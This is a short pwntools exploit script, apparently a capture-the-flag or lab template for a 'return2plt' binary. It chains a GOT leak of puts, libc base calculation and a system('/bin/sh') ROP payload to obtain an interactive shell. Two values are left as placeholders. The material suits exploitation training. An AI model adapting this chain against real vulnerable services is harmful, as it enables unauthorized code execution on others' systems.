from pwn import *

# Set context for binary architecture
context.binary = elf = ELF('./return2plt')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust libc path as needed

# Start process or remote connection
p = process()

# Step 1: Find offset (assumed known from cyclic pattern)
offset =  n ## offset required to overwrite return address

# Step 2: Leak puts address from GOT
rop = ROP(elf)
pop_rdi = ## address of pop rdi instruction
main = elf.symbols['main']  # To return after leak

payload = cyclic(offset) + pack(pop_rdi) + pack(elf.got.puts) + pack(elf.sym.puts) + pack(main)

p.sendline(payload)
# Receive leaked puts address
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'Leaked puts address: {hex(leaked_puts)}')

# Step 3: Calculate libc base and system/binsh addresses
libc.address = leaked_puts - libc.symbols['puts']
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))

log.info(f'Libc base: {hex(libc.address)}')
log.info(f'system address: {hex(system_addr)}')
log.info(f'/bin/sh address: {hex(binsh_addr)}')

# Step 4: Craft final payload to get shell
payload2 = b'A' * offset
payload2 += pack(pop_rdi)
payload2 += pack(binsh_addr)
payload2 += p64(rop.find_gadget(['ret'])[0])  # Stack alignment if needed
payload2 += pack(system_addr)

p.sendlineafter('Input:', payload2)

# Interact with shell
p.interactive()
